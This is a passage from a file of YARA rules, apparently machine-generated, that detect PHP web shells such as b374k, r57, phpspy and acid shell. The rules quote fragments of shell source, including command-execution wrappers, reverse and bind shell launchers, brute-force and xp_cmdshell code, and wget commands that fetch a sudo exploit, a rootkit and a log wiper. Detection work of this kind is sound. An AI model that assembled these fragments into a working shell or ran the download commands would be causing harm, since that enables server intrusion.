      $s12 = "setcookie(\"cwd\", $s_cwd ,time() + $s_login_time);" fullword ascii
      $s13 = "setcookie(\"b374k\",$s_login,time() + $s_login_time);" fullword ascii
      $s14 = "setcookie(\"s_self\", $s_self ,time() + $s_login_time);" fullword ascii
      $s15 = "setcookie(\"s_home\", $s_home ,time() + $s_login_time);" fullword ascii
      $s16 = "this.value = this.value.substring(0,this.selectionStart) + \"\\t\" + this.value.substring(this.selectionEnd);" fullword ascii
      $s17 = "$s_reload = (isset($_COOKIE['b374k_included']) && isset($_COOKIE['s_home']))? rtrim(urldecode($_COOKIE['s_self']),\"&\"):\"\";" fullword ascii
      $s18 = "&nbsp;&nbsp;Separate multiple commands with a semicolon  <span class='gaya'>[</span> ; <span class='gaya'>]</span></p>" fullword ascii
      $s19 = "<tr><td>Password</td><td><input style='width:100%;' class='inputz' type='password' name='sqlpass' value='' /></td></tr>" fullword ascii
      $s20 = "$s_buff = rs($s_rstype,$s_rstarget_packed,$s_rscode);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _5e74b8d3ac3844c24f0642b80a3c8696_61466b28920b5c7fe7f9020295d027347d9cc1c3_23
{
   meta:
      description = "php17 - from files 5e74b8d3ac3844c24f0642b80a3c8696.php, 61466b28920b5c7fe7f9020295d027347d9cc1c3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a97f9d0c8747d4acd6d22ff6f7a96cce11165b55e68dc5883a515c8d40a645e2"
      hash2 = "79f1a6a508b704825f4090096b2ce143fcbb335494cfd76b79172890181d93a5"
   strings:
      $x1 = "$db = mysql_connect($_POST['mysql_host'].':'.$_POST['mysql_port'],$_POST['mysql_login'],$_POST['mysql_passw']);" fullword ascii
      $x2 = "iv >';$sqlq =  $_POST['sql'];$db = mysql_connect($dbhost.':'.$dbport,$dblogin,$dbpass);if($db)" fullword ascii
      $x3 = "elseif(function_exists('passthru')){ob_start();passthru($cmd);$result = ob_get_contents();ob_end_clean();}" fullword ascii
      $x4 = "if(function_exists('system')){ob_start();system($cmd);$result = ob_get_contents();ob_end_clean();}" fullword ascii
      $s5 = "if($os == \"nix\"){$pwd = exec(\"pwd\");} elseif($os == \"win\"){$pwd = exec(\"cd\");} if(empty($pwd)) {$pwd = getcwd();}" fullword ascii
      $s6 = "<html><head><style>body{background:#333;}</style><title>login </title></head>" fullword ascii
      $s7 = "if ($_POST['login'] == $login && $_POST['password'] == $password){" fullword ascii
      $s8 = "elseif(function_exists('shell_exec')){$result = shell_exec($cmd);}" fullword ascii
      $s9 = "bye-bye ): </div><br/><br/>\"; do_footer($ver);}else{error('Unable to delete shell', $ver);} die();break;" fullword ascii
      $s10 = "function cmd_exec($cmd2)" fullword ascii
      $s11 = "if (!empty($_POST['login']) && !empty($_POST['password'])){" fullword ascii
      $s12 = "if (isset ($_POST['do']) && $_POST['do']=='logout') { unset($_SESSION['logged']); }" fullword ascii
      $s13 = "elseif(function_exists('exec')){exec($cmd,$result);$result = join(\"\\n\",$result);}" fullword ascii
      $s14 = "<b><form method=\"post\" style=\"margin:0px;\">&copy;</b><input type=\"submit\" value=\"cihshell\" name=\"do\"" fullword ascii
      $s15 = "'/'.$_POST['dirname'].\"&nbsp;was successfuly created.\");}else{error('An error occured while creating dir', $ver);}" fullword ascii
      $s16 = "elseif(is_resource($f = popen($cmd,\"r\"))){$result = \"\";while(!feof($f)) { $result .= fread($f,1024); }pclose($f);}" fullword ascii
      $s17 = ".txt {background:#222; border:1px solid #333; color:#999; font-family:Verdana, Arial;font-size:10px; padding:5px;}" fullword ascii
      $s18 = "if(!isset($_POST['mysql_port']) || empty($_POST['mysql_port'])) { $_POST['mysql_port'] = \"3306\"; }" fullword ascii
      $s19 = "else {echo ' <html><head><style>body{background:#333;}</style><title>login </title></head><body><table style=\"margin-left:100px" ascii
      $s20 = "if (isset($_POST['mysqlw_host'])){$dbhost = $_POST['mysqlw_host'];} else {$dbhost = 'localhost';}if (isset($_POST['mysqlw_db']))" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _1b2a4a7174ca170b4e3a8cdf4814c92695134c8a_385c95f5347f8e95fbb3730f171ae92d53c7dc7a_76d55304af1e98d84dee3edada2a465718651717__24
{
   meta:
      description = "php17 - from files 1b2a4a7174ca170b4e3a8cdf4814c92695134c8a.php, 385c95f5347f8e95fbb3730f171ae92d53c7dc7a.php, 76d55304af1e98d84dee3edada2a465718651717.php, 9077eb05f4ce19c31c93c2421430dd3068a37f17.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0333ec13d20d42f1f1a34713976c0ee31c9c867f0707f74630b0fbbf343eb7ce"
      hash2 = "71305372f75d31a6f2e3009f82183ae95e056c8f005456563d71885089c9c90e"
      hash3 = "f92024095543f5977f3c2002ee73cd9a7969df660d6bff39e04ac9a5bf69a427"
      hash4 = "b9800538721367a9770984d637d8d20946c02537d76c86965e532c08e2242251"
   strings:
      $s1 = "echo shell_exec($_POST['command']);" fullword ascii
      $s2 = "<form action=<?php echo $surl ?>?&<?php echo $word ?>&exec_st method=\"post\">" fullword ascii
      $s3 = "<form action=<?php echo $surl ?>&<?php echo $word ?>&exec method=\"post\">" fullword ascii
      $s4 = "mkdir(urldecode($_POST['dir']).\"/\".$_POST['name']) or die (\"[-]Error creating dir!\");" fullword ascii
      $s5 = "if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir .\"/\". $_FILES['userfile']['name'])) {" fullword ascii
      $s6 = "echo \"</a></td><td><a href=\".$surl.\"&\".$word.\"&download&file_browser&file=\".urlencode($j_d).\"/\".urlencode($file).\">\";" fullword ascii
      $s7 = "<input type=\"submit\" name=\"sub\" value=\"Execute\"><br>" fullword ascii
      $s8 = "unlink(urldecode($dir).\"/\".$file) or die (\"[-]Error @ file:\".$file.\"\");" fullword ascii
      $s9 = "echo \"</textarea><br><br><input type=hidden name=file value=\".urlencode($_GET['file']).\"><input type=submit name=sub valu" fullword ascii
      $s10 = "<form enctype=\"multipart/form-data\" action=<?php echo $surl ?>&<?php echo $word ?>&upload method=\"post\">" fullword ascii
      $s11 = "By turning \"on\" safe you can make your shell in 404 Not Find mode if the user doesnt know your OWN set word!" fullword ascii
      $s12 = "<form action=<?php echo $surl ?>?&<?php echo $word ?>&special_d&file=<?php echo urlencode($filename) ?> method=post>" fullword ascii
      $s13 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZGVzYwAAAAAAAAAuSUVDIDYxOTY2LTIuMSBEZWZhdWx0" fullword ascii
      $s14 = "<form enctype=\"multipart/form-data\" action=<?php echo $surl ?>&<?php echo $word ?>&special_crypt method=\"post\">" fullword ascii
      $s15 = "LFJlZmVyZW5jZSBWaWV3aW5nIENvbmRpdGlvbiBpbiBJRUM2MTk2Ni0yLjEAAAAAAAAAAAAAACxS" fullword ascii
      $s16 = "ZWZlcmVuY2UgVmlld2luZyBDb25kaXRpb24gaW4gSUVDNjE5NjYtMi4xAAAAAAAAAAAAAAAAAAAA" fullword ascii
      $s17 = "AABDb3B5cmlnaHQgKGMpIDE5OTggSGV3bGV0dC1QYWNrYXJkIENvbXBhbnkAAGRlc2MAAAAAAAAA" fullword ascii
      $s18 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF" ascii
      $s19 = "header('Content-Transfer-Encoding: Binary');" fullword ascii
      $s20 = "echo \"[+]Update Aviable!...Please download new version from:\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _2013_5b9824d1b6de1963106fcabcbd08b1f87a29de30_7a46a87a95f54ab5afc04ff43e14a060d7062f26_angel2_25
{
   meta:
      description = "php17 - from files 2013.php, 5b9824d1b6de1963106fcabcbd08b1f87a29de30.php, 7a46a87a95f54ab5afc04ff43e14a060d7062f26.php, angel2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "106c686e2688535d2ff747203fdec675096fc9287655f833485520ae5e8365bb"
      hash2 = "4cb2f9e72641a594228669c0e2eb2188cc32fb13ae6708f3d2d39c620a76c8a9"
      hash3 = "a198556031139dcbe1c02e2e6e668f4388f4b1277c90fcf425e6834b934df75e"
      hash4 = "3ceb493e17daaaa547f05cf557885715fb575e684512dfc6b679c91285835995"
   strings:
      $x1 = "formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\\'shell\\',null,this.p1.value);return false;'));" fullword ascii
      $x2 = "<a href=\"javascript:g('shell',null,'','','','','<?php echo $charset;?>');\">Execute Command</a> | " fullword ascii
      $x3 = "2013 final</a>. Copyright (C) 2004-2013 <a href=\"http://www.4ngel.net\" target=\"_blank\">[S4T]</a> All Rights Reserved." fullword ascii
      $x4 = "p('<p><a href=\"http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $x5 = "$res = execute(which('perl').\" /tmp/angel_bc \".$p2.\" \".$p3.\" &\");" fullword ascii
      $s6 = "$res = execute(\"/tmp/angel_bc \".$p2.\" \".$p3.\" &\");" fullword ascii
      $s7 = "<title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
      $s8 = "p('<p class=\"red\">MySQL '.$DB->version().' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');" fullword ascii
      $s9 = "p('<pre>'.execute($p1).'</pre>');" fullword ascii
      $s10 = "$attachsize = '<a href=\"javascript:g(\\'file\\', null, \\'getsize\\', \\''.$dirdb['filename'].'\\');\">Stat</a>';" fullword ascii
      $s11 = "m('Database has backup to <a href=\"'.$fileurl.'\" target=\"_blank\">'.$P['bak_path'].'</a>');" fullword ascii
      $s12 = "if( strpos( strtolower( $_SERVER['HTTP_USER_AGENT'] ), 'bot' ) !== false ) {" fullword ascii
      $s13 = "echo \"<p class=\\\"b\\\">Mysql error description: \".htmlspecialchars($this->geterrdesc()).\"</p>\\n\";" fullword ascii
      $s14 = "27 => array('Safe mode exec dir',getcfg('safe_mode_exec_dir'))," fullword ascii
      $s15 = "21 => array('upload_max_filesize',(getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed'))," fullword ascii
      $s16 = "formhead(array('title'=>'Eval PHP Code', 'onsubmit'=>'g(\\'eval\\',null,this.p1.value);return false;'));" fullword ascii
      $s17 = "<form onsubmit=\"g('file',this.cwd.value);return false;\" method=\"POST\" id=\"godir\" name=\"godir\">" fullword ascii
      $s18 = "<a href=\"javascript:g('portscan',null,'','','','','<?php echo $charset;?>');\">Port Scan</a> | " fullword ascii
      $s19 = "13 => array('Administrator',(isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from')))," fullword ascii
      $s20 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=<?php echo $charset;?>\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _502adcbc50636b667202497c1f398a36413e3284_63187568f13bf233f781f008c528b0e160650211_6f53dce817b117198fc0950d87e362fdcf7852e2_26
{
   meta:
      description = "php17 - from files 502adcbc50636b667202497c1f398a36413e3284.php, 63187568f13bf233f781f008c528b0e160650211.php, 6f53dce817b117198fc0950d87e362fdcf7852e2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "80fa31cc87c2618a5ea267baed3707f78b4b7d4a20cc8a91b231d5ce1d1a42e8"
      hash2 = "2a5f0fc4984d08fa9e8c3c5ccda1b09438d6bd04a7f962844088a6c45e248d71"
      hash3 = "1dc571ae9a2775e50505fa455a9d32b6953bc00e16afbe7fc225e8993b2e6c7a"
   strings:
      $s1 = "if (eregi(\"%%%filedata%%%\",$data)) {$data = str_replace(\"%%%filedata%%%\",file_get_contents($v),$data);}" fullword ascii
      $s2 = "$acts = array(\"\",\"newdb\",\"serverstat\",\"servervars\",\"processes\",\"getfile\");" fullword ascii
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s4 = "else {echo \"ERROR. Can't send signal \".htmlspecialchars($sig).\", to process #\".htmlspecialchars($pid).\".\";}" fullword ascii
      $s5 = "<input type=checkbox NAME=world[2] value=1\".$world_x.\">Execute</font></td>" fullword ascii
      $s6 = "<input type=checkbox NAME=group[2] value=1\".$group_x.\">Execute</font></td>" fullword ascii
      $s7 = "if ($sess_method == \"file\") {$sess_data = unserialize(file_get_contents($sess_file));}" fullword ascii
      $s8 = "else {echo \"<form method=\\\"POST\\\"><br>Read first: <input type=\\\"text\\\" name=\\\"fqb_lenght\\\" value=\\\"\".$nixpwdperp" ascii
      $s9 = "elseif ($dump_out == \"download\")" fullword ascii
      $s10 = "if ($dump_out == \"download\") {exit;}" fullword ascii
      $s11 = "if (!in_array($sh,array(\"/bin/bash\",\"/bin/sh\",\"/usr/local/cpanel/bin/jailshell\"))) {$true = false;}" fullword ascii
      $s12 = "if( $mode & 0x200 ) {$world['execute'] = ($world[execute]==\"x\") ? \"t\" : \"T\";}" fullword ascii
      $s13 = "if( $mode & 0x800 ) {$owner['execute'] = ($owner[execute]==\"x\") ? \"s\" : \"S\";}" fullword ascii
      $s14 = "if( $mode & 0x400 ) {$group['execute'] = ($group[execute]==\"x\") ? \"s\" : \"S\";}" fullword ascii
      $s15 = "echo \"<br><form method=\\\"POST\\\"><TABLE cellSpacing=0 cellPadding=1 bgColor=#333333 borderColorLight=#333333 border=1>\";" fullword ascii
      $s16 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s17 = "foreach ($host_allow as $k=>$v) {$tmp[]=  str_replace(\"\\\\*\",\".*\",preg_quote($v));}" fullword ascii
      $s18 = "if (!$login) {$login = $PHP_AUTH_USER; $md5_pass = md5($PHP_AUTH_PW);}" fullword ascii
      $s19 = "if(($PHP_AUTH_USER != $login ) or (md5($PHP_AUTH_PW) != $md5_pass))" fullword ascii
      $s20 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _0663a4ddceacb40b095eda264a85f15c_a1495d2f71d54c48c734786d4845953c894908df_27
{
   meta:
      description = "php17 - from files 0663a4ddceacb40b095eda264a85f15c.php, a1495d2f71d54c48c734786d4845953c894908df.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "01e7c95ffe299c757677f0eaf69745178ee5a374ceb64652d4a673bf365cdc8b"
      hash2 = "69dfca5dade343714567f461ae3e8519284cdb5996230b6195cb7bbad7d01903"
   strings:
      $x1 = "<center><input type=submit value='File List' name=filelist> - <input type=submit value='View PhpInfo' name=phpinfo> - <input typ" ascii
      $x2 = "='Cmd Execution' name='commex'> - <input type='submit' name='logeraser' value='Logs Eraser'> - <input type='submit' name='connec" ascii
      $s3 = "// Dump Database [pacucci.com]" fullword ascii
      $s4 = "if(isset($_POST['dump']) && isset($user) && isset($pass) && isset($db)){" fullword ascii
      $s5 = "$millink=\"http://milw0rm.com/search.php?dong=Linux Kernel\".$Lversion;" fullword ascii
      $s6 = "$mysql = mysql_connect(\"localhost\", $user, $pass)or die(\"<script>alert('Connection Failed')</script>\");" fullword ascii
      $s7 = "$aids = passthru(\"perl cbs.pl \".$_POST['connhost'].\" \".$_POST['connport']);" fullword ascii
      $s8 = "$dump = \"-- Database: \".$_POST['db'] .\" \\n\";" fullword ascii
      $s9 = "<input type='submit' value='Sorguyu Calistir' name='godb'><br><input type='submit' name='dump' value='Database'yi Dump Et'>" fullword ascii
      $s10 = "$headers .= \"\\r\\nContent-Type: multipart/alternative; boundary=\\\"PHP-alt-\".$random_hash.\"\\\"\";" fullword ascii
      $s11 = "<b>IP:</b> <u>\" . $_SERVER['REMOTE_ADDR'] .\"</u> - Server IP:</b> <a href='http://whois.domaintools.com/\". $_SERVER['SERVER_A" ascii
      $s12 = "<b>IP:</b> <u>\" . $_SERVER['REMOTE_ADDR'] .\"</u> - Server IP:</b> <a href='http://whois.domaintools.com/\". $_SERVER['SERVER_A" ascii
      $s13 = "<font size='1' face='Verdana'>Username: - Password:</font><br>" fullword ascii
      $s14 = "$dump .= \"-- CWShellDumper v3\\n\";" fullword ascii
      $s15 = "<form method='post' action=''><input type='text' name='connhost' size='15'value='target'> <input type='text' name='connport' siz" ascii
      $s16 = "elseif(eregi('config',$listz) && eregi('.php',$listz)) { @$listf.= '<tr><td valign=top><img src=?com=image&img=file><font siz" fullword ascii
      $s17 = "<center><b><font size='2' face='Verdana'>Safe-Mode Bypass[Dosyalar]<br></font></b>" fullword ascii
      $s18 = "$aidx = passthru(\"perl logseraser.pl \".$_POST['functionp']);" fullword ascii
      $s19 = "$dump .= \"-- r57.biz\\n\";" fullword ascii
      $s20 = "face=Verdana>'.$typezz.'</font></td><td valign=top></td><td valign=top><font size=2 face=Verdana>' . getperms($list) .'</font><" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _2250b6f81f0189b50fb5391a1a4c5738370cfa61_404__2__404_404_php_no_404__2__99a549eaba203e1a4f972811cc417f693ab4be4c_28
{
   meta:
      description = "php17 - from files 2250b6f81f0189b50fb5391a1a4c5738370cfa61.php, 404 (2).php, 404.php, 404.php.no.php, 404__2_.php, 99a549eaba203e1a4f972811cc417f693ab4be4c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "30a287d13b6729cebd14e7e3078428a7a9d0d4e3868fd6a1247a050721bbcb92"
      hash2 = "8d5918b308273d96c1a511c6c7905a8ce1513c61fa88939cbd1c43b774e17950"
      hash3 = "00772e6c4839045b73e078c73645f441daf9bfffc95f5604b6995e7792eedf66"
      hash4 = "fb11c438682498254ede5200573674ff180ae888b92aee9996db7800fa55b4c4"
      hash5 = "851c740b3ab1c15cbff2daf0098ac87c00b4b1496675d14e0ee95f307c3b3c01"
      hash6 = "e16ceb2d3015fbe3fa042c6b021e91fa6fd118bd3e64fe28f78b84c13a9648e1"
   strings:
      $x1 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) { " fullword ascii
      $x2 = "$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']); " fullword ascii
      $x3 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) return true; " fullword ascii
      $x4 = ".'<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login ->" fullword ascii
      $x5 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror'); " fullword ascii
      $x6 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) " fullword ascii
      $s7 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) { " fullword ascii
      $s8 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch'); " fullword ascii
      $s9 = "$temp = \"document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='\".addcsla" fullword ascii
      $s10 = "header(\"Content-Disposition: attachment; filename=dump.sql\"); " fullword ascii
      $s11 = "echo ' <input type=checkbox name=ajax value=1 '.($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJ" fullword ascii
      $s12 = "echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:" fullword ascii
      $s13 = "echo \"<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\\\"do" fullword ascii
      $s14 = "$res = @mysql_connect($ip.':'.$port?$port:3306, $login, $pass); " fullword ascii
      $s15 = "function bruteForce($ip,$port,$login,$pass) { " fullword ascii
      $s16 = "\"Find *config*.php in current dir\" => \"dir /s /w /b *config*.php\", " fullword ascii
      $s17 = "echo @file_get_contents($temp); " fullword ascii
      $s18 = "echo '<h1>Results</h1><div class=content><span>Type:</span> '.htmlspecialchars($_POST['proto']).' <span>Server:</span> '" fullword ascii
      $s19 = "$bind_port_p=\"IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc2" fullword ascii
      $s20 = "\"find config* files in current dir\" => \"find . -type f -name \\\"config*\\\"\", " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _15e31a66891cbd2c55427678d32f149faf39a0ce_a9f6388eac0eaa83fb918cec6a54a073818c7682_29
{
   meta:
      description = "php17 - from files 15e31a66891cbd2c55427678d32f149faf39a0ce.php, a9f6388eac0eaa83fb918cec6a54a073818c7682.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "734eb849b064304217773d4ecc46c8d9fcd611bdf3c011acfa3da38c208a272c"
      hash2 = "ef6dd73e7cc055e1bd6e1618fbfc44f0043e15a6f2206d0c43f6f4b13646e569"
   strings:
      $x1 = "$alias=\"<option value='netstat -an | grep -i listen'>Display open ports</option><option value='last -a -n 250 -i'>Show last 250" ascii
      $x2 = "if(checkfunctioN('passthru')){ob_start();passthru($command);$exec=ob_get_contents();ob_clean();ob_end_clean();}" fullword ascii
      $x3 = "$alias=\"<option value='netstat -an'>Display open ports</option><option value='tasklist'>List of processes</option><option value" ascii
      $x4 = "if(!$bd)echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $ip $port &\");" fullword ascii
      $x5 = "if(!$bd)echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $port &\");" fullword ascii
      $x6 = "logged in users</option><option value='which wget curl lynx w3m'>Downloaders</option><option value='find / -perm -2 -type d -pri" ascii
      $x7 = "elseif(checkfunctioN('popen')){$output=popen($command,'r');while(!feof($output)){$exec=fgets($output);}pclose($output);}" fullword ascii
      $x8 = "_exists('/var/cpanel/accounting.log'))$alias.=\"<option value='cat /var/cpanel/accounting.log'>Display cPanel`s log</option>\";" fullword ascii
      $x9 = "elseif(checkfunctioN('win32_create_service'))$exec=srvshelL($command);" fullword ascii
      $s10 = "if (!$bd)echo $error;else shelL(\"perl.exe $name $ip $port\");" fullword ascii
      $s11 = "elseif(checkfunctioN('exec')){exec($command,$output);$output=join(\"\\n\",$output);$exec=$output;}" fullword ascii
      $s12 = "if(!empty($_REQUEST['hosT']) && !empty($_REQUEST['useR']) && isset($_REQUEST['pasS']) && function_exists('ftp_connect')){" fullword ascii
      $s13 = "'net user'>Users list</option><option value='shutdown -s -f -t 1'>Turn off the server</option>\";" fullword ascii
      $s14 = "elseif(is_object($ws=new COM('WScript.Shell')))$exec=comshelL($command,$ws);" fullword ascii
      $s15 = "mssql_query(\"insert into $tb EXEC master.dbo.xp_cmdshell '\".$_REQUEST['coM'].\"'\",$db);" fullword ascii
      $s16 = "if(empty($CPU))$CPU=shelL('echo %PROCESSOR_IDENTIFIER%');" fullword ascii
      $s17 = "if($res=='20'){echo \"U: $user P: $pass</br>\";if($log)file_add_contentS($file,\"U: $user P: $pass\\r\\n\");}" fullword ascii
      $s18 = "elseif(checkfunctioN('win_shell_execute'))$exec=winshelL($command);" fullword ascii
      $s19 = "elseif(checkfunctioN('shell_exec'))$exec=shell_exec($command);" fullword ascii
      $s20 = "if($ip!=$adr){echo \"Subdomain Found: <a href='http://$adr' target='_blank'>$adr($ip)</a>\\n\";}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _5e30aaf3a47521d99232b5148a53ecd3fec43c9b_9223d9256484635439016d2e26100cb17327cc2d_30
{
   meta:
      description = "php17 - from files 5e30aaf3a47521d99232b5148a53ecd3fec43c9b.php, 9223d9256484635439016d2e26100cb17327cc2d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "374dfef917872d886c316b864558413d5c11988fc148c3a0819090a67ee32145"
      hash2 = "4947368cb486df42337fd7e41368be3b0fed2527322fba96b389997cd20a3433"
   strings:
      $x1 = "elseif(isset($_REQUEST['pgsqlcon']) && ($con = pg_connect(\"host=$sqlhost user=$sqluser password=$sqlpass port=$sqlport\"))){" fullword ascii
      $s2 = "else $s_auth = true; // $s_pass variable (password) is empty , go ahead, no login page" fullword ascii
      $s3 = "<?php if(isset($_REQUEST['cmd'])) echo \"if(document.getElementById('cmd')) document.getElementById('cmd').focus();\"; ?>" fullword ascii
      $s4 = "// http://www.kryogenix.org/code/browser/sorttable/ - this makes the tables sortable" fullword ascii
      $s5 = "// resources $xback_pl $xbind_pl $xback_c $xbind_c $xmulti_py $wmulti_c... this was used with bind and reverse shell" fullword ascii
      $s6 = "if(!$s_win) $rsres = rs($s_win, cp($d),  \"xback_bin\" ,$xback_c, $rstarget);" fullword ascii
      $s7 = "if(!$s_win) $rsres = rs($s_win, cp($d),  \"xbind_bin\" ,$xbind_c, $rstarget);" fullword ascii
      $s8 = "elseif(isset($_REQUEST['oraclecon']) && ($con = oci_connect($sqluser,$sqlpass,$hostandport))){" fullword ascii
      $s9 = "elseif(isset($_REQUEST['mssqlcon']) && ($con = mssql_connect($hostandport,$sqluser,$sqlpass))){" fullword ascii
      $s10 = "if(isset($_REQUEST['mysqlcon']) && ($con = mysql_connect($hostandport,$sqluser,$sqlpass))){" fullword ascii
      $s11 = "else $rsres = rs($s_win, cp($d),  \"xbind_bin\" ,$wmulti_c, $rstarget);" fullword ascii
      $s12 = "$rsres = rs($s_win, cp($d),  \"xbind_pl\" ,$xbind_pl, $rstarget);" fullword ascii
      $s13 = "else $rsres = rs($s_win, cp($d),  \"xback_bin\" ,$wmulti_c, $rstarget);" fullword ascii
      $s14 = "$rsres = rs($s_win, cp($d),  \"xbind_py\" ,$xmulti_py, $rstarget);" fullword ascii
      $s15 = "$imglink = \"<p><a href=\\\"?d=\".$pwd.\"&amp;img=\".$filn.\"\\\" target=\\\"_blank\\\">" fullword ascii
      $s16 = "if (ini_get(\"safe_mode\") or strtolower(ini_get(\"safe_mode\")) == \"on\")  $s_safemode = TRUE; else $s_safemode = FALSE;" fullword ascii
      $s17 = "header(\"Content-disposition: attachment; filename=\\\"\".basename($f).\".gz\\\";\");" fullword ascii
      $s18 = "if(isset($_REQUEST['rstarget2'])) $rstarget2 = ss($_REQUEST['rstarget2']);" fullword ascii
      $s19 = "if(isset($_REQUEST['rstarget1'])) $rstarget1 = ss($_REQUEST['rstarget1']);" fullword ascii
      $s20 = "if(isset($_REQUEST['rstarget3'])) $rstarget3 = ss($_REQUEST['rstarget3']);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _15febc7c452fb361fc5eca8e67711a86a9ee0b9e_36c1b4eaebafcab661febec9cbce65e6c4e063d4_398fcc4176cbdefb9271ad67decbab5c08312bf2__31
{
   meta:
      description = "php17 - from files 15febc7c452fb361fc5eca8e67711a86a9ee0b9e.php, 36c1b4eaebafcab661febec9cbce65e6c4e063d4.php, 398fcc4176cbdefb9271ad67decbab5c08312bf2.php, 67782cfe732cea7fbc4c91e9133b005ad9401377.php, 9f18fc1e8b779eec4d289eea454f05549d387a51.php, acid.php, acidshell.php, AntiSecShell.v0.5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash2 = "dad311ac627ea5509814218f21e1f11d0f61632866aadaf5c3a43629f5801c1b"
      hash3 = "2884d456f6a33415db1ce6c8ef4a9a6ed860b3f76482c8460d27bd83120858ab"
      hash4 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
      hash5 = "d43cdb0daf132269b0a706a1a1b4970450fbaba34492e056305cab320f8c4ba5"
      hash6 = "a6580477b138c01f062a33f2f204f412d3ffcdfd44dd6bffe476aefefab1fca3"
      hash7 = "a455a962041f9ef980414ecb1695c263cea42c41731caf1f0c34293cc937b1ef"
      hash8 = "da5ea23323881addae2ecd9a44947f05d5dbc216ac24cdf9361b14f18ea8e31c"
   strings:
      $x1 = "array(\"wget Sudo Exploit\",\"wget http://www.securityfocus.com/data/vulnerabilities/exploits/sudo-exploit.c\")," fullword ascii
      $x2 = "\"<tr><td></td><td><input type=\\\"checkbox\\\" name=\\\"fqb_onlywithsh\\\" value=\\\"1\\\"> Users only with shell</td></tr>\"." fullword ascii
      $x3 = "array(\"wget RatHole 1.2 (Linux & BSD)\",\"wget http://packetstormsecurity.org/UNIX/penetration/rootkits/rathole-1.2.tar.gz\")," fullword ascii
      $x4 = "echo \"<b>Dumped! Dump has been writed to \\\"\".htmlspecialchars(realpath($sql_dump_file)).\"\\\" (\".view_size(filesiz" fullword ascii
      $x5 = "array(\"Downloaders?\",\"which wget curl w3m lynx fetch lwp-download\")," fullword ascii
      $x6 = "array(\"wget WIPELOGS PT1\",\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\")," fullword ascii
      $s7 = "array(\"Cpanel Config\",\"/var/cpanel/accounting.log\")," fullword ascii
